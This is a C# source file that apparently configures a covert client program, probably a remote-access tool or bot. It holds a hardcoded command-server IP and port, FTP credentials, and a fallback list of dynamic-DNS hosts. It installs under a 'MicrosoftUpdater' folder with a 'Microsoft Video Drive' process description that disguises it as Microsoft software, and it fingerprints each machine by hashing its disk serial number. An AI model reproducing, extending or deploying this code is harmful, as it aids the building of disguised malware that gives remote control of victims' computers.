using System;
using System.Collections.Generic;
using System.Management;
using System.Security.Cryptography;
using System.Text;

namespace ClientWorker
{
    public static class StartData
	{
		public static string currentServer = "185.195.27.144";
        public static int port = 7777;
        public static string ftpUser = "ff";
		public static string ftpPass = "oTEDLaRbXg";
		public static int ftpPort = 21345;
		public static string floaderNewCopy = "\\MicrosoftUpdater\\";
		public static string service = "Service.exe";
		public static string updater = "Updater.exe";
        public static string DescriptionProcess = "Service";

        public static string MProcDescription = "Microsoft Video Drive";

        public static List<string> ddnsHostName = new List<string>
		{
            "fokes1.ddns.net",
            "185.228.233.199",
            "fizerfox.ru",
			"fokes1.asuscomm.com"
		};

		public static List<string> listFiles = new List<string>
		{
			"Service.exe"
		};

        private static string RandomString(int size)
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            return builder.ToString();
        }

        public static void GenerateKey()
        {
            try
            {
                string serialNumber = "";
                ManagementObjectSearcher searcher =
                    new ManagementObjectSearcher("root\\CIMV2",
                    "SELECT * FROM Win32_DiskDrive");

                foreach (ManagementObject queryObj in searcher.Get())
                {
                    serialNumber = queryObj["SerialNumber"].ToString();
                    if (!string.IsNullOrWhiteSpace(serialNumber)) break;
                }

                if (!string.IsNullOrWhiteSpace(serialNumber))
                {
                    byte[] hash = ((HashAlgorithm)CryptoConfig.CreateFromName("MD5")).ComputeHash(new UTF8Encoding().GetBytes(serialNumber));
                    string encoded = BitConverter.ToString(hash).Replace("-", string.Empty).ToLower();
                    Service.Properties.Settings.Default.Key = encoded;
                }
                else
                {
                    Service.Properties.Settings.Default.Key = RandomString(32);
                }
            }
            catch(Exception ex)
            {
                Service.Properties.Settings.Default.Key = RandomString(32);
            }
        }
    }
}
